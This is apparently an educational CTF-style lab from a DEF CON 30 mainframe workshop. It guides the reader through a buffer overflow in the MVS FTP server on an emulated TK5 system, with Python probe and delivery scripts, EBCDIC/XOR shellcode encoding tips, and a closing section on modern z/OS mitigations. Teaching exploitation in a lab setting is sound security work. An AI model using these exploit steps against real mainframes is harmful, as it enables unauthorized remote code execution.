title: DC30 Lab 10: FTP Buffer Overflow — Remote Code Execution
description: Exploit a buffer overflow in the MVS FTP server via a long USER command. Use De Bruijn patterns to find the offset, craft EBCDIC-safe shellcode, and achieve remote code execution on the mainframe over the network — no TSO session required.

steps.title: The Attack Surface
steps.screen:
FTP Buffer Overflow — Remote Attack

Target: MVS FTPD server on port 2121
Vuln:   Long USER command overflows a fixed buffer
Result: Remote code execution as the FTP server address space

Why this differs from the HELLO overflow:
  - No TSO session needed — pure network attack
  - FTP runs as a started task with elevated privileges
  - Shellcode must survive FTP protocol parsing
  - EBCDIC encoding constraints apply to every byte

Prerequisites:
  - FTPD running: submit jcl/ftpd.jcl first
  - Verify: nc -z localhost 2121
  - Tools: scripts/e2alookup.py, scripts/findbytes.py
steps.expected: Confirm FTPD is running on port 2121 and understand the attack surface.
steps.hint: Start FTPD by submitting jcl/ftpd.jcl via port 3505, or POST /api/mainframe/start-ftpd. Verify with: python scripts/herc_automation.py --status

steps.title: Probe the Overflow
steps.screen:
Generate a 1500-byte De Bruijn sequence and send as FTP USER:

  python3 -c "
import socket
s = socket.socket()
s.connect(('localhost', 2121))
print(s.recv(1024))          # 220 banner
pattern = 'AABACADAEAFAGAHAIAJAKALAMANA...'  # De Bruijn 1500
s.send(f'USER {pattern}\r\n'.encode())
print(s.recv(1024))
"

If the FTP server crashes, check hardcopy.log:
  tail -20 tk5/mvs-tk5/log/hardcopy.log

The 4 bytes at the crash address = your offset in De Bruijn.
steps.expected: Send a 1500-byte De Bruijn USER command and observe the FTP server crash.
steps.hint: Run DEBRUIJN.rex on the mainframe to generate the pattern: TSO DEBRUIJN 1500. Download via FTP in ASCII mode. The crash address in hardcopy.log tells you the exact byte offset.

steps.title: EBCDIC Shellcode Constraints
steps.screen:
The EBCDIC Problem

MVS FTP parses USER commands in EBCDIC.
Your shellcode bytes must:
  1. Be valid EBCDIC (no null bytes, no control chars)
  2. Not be interpreted as FTP control characters
  3. Survive ASCII->EBCDIC translation from Linux

Tools:
  python scripts/a2etable.py       -- print full table
  python scripts/e2alookup.py C1   -- EBCDIC C1 -> ASCII
  python scripts/findbytes.py 90   -- find XOR-safe encoding

XOR encoding trick:
  If byte 0xXX is invalid, XOR with 0x99
  Prepend a decoder stub that XORs back
  findbytes.py automates this
steps.expected: Understand EBCDIC encoding constraints and use the conversion tools.
steps.hint: Key mappings: EBCDIC 0x40=space, 0xF0-0xF9=digits, 0xC1-0xC9=A-I, 0xD1-0xD9=J-R, 0xE2-0xE9=S-Z. Avoid 0x00-0x3F (control chars) and 0xFF.

steps.title: Craft and Deliver the Exploit
steps.screen:
WTO shellcode (proof of execution):
  Assemble on mainframe -> download binary via FTP
  Insert at De Bruijn offset
  Set return address to point to shellcode

Send exploit:
  import socket
  with open('exploit.bin','rb') as f: payload = f.read()
  s = socket.socket()
  s.connect(('localhost', 2121))
  s.recv(1024)  # banner
  s.send(b'USER ' + payload + b'\r\n')

Check hardcopy.log for:
  +MAINFRAME PWNED VIA FTP
steps.expected: Send the exploit and see the WTO message in hardcopy.log.
steps.hint: Monitor: tail -f tk5/mvs-tk5/log/hardcopy.log | grep PWNED. Or use herc_automation.py: h.wait_for_string('MAINFRAME PWNED')

steps.title: Defenses and Mitigations
steps.screen:
Why This Works on MVS 3.8j / TK5:
  - No ASLR (addresses are static and predictable)
  - No NX/DEP (stack memory is executable)
  - No stack canaries
  - FTPD runs with elevated authority

Modern z/OS Mitigations:
  - ASLR via address space randomization
  - Execute protection (NX equivalent)
  - RACF program control
  - SMF logging of all FTP sessions
  - AT-TLS for encrypted FTP
  - RACF profiles restricting FTP access

Real-world relevance:
  - Many shops run legacy FTPD versions
  - FTP often bypasses network security monitoring
  - FTP credentials = TSO credentials = full system access
steps.expected: Understand why this works and what modern z/OS does to prevent it.
steps.hint: In a real z/OS pentest, FTP is often the first service to probe. Even without buffer overflows, FTP gives you dataset read/write access using TSO credentials — which is often enough to escalate.
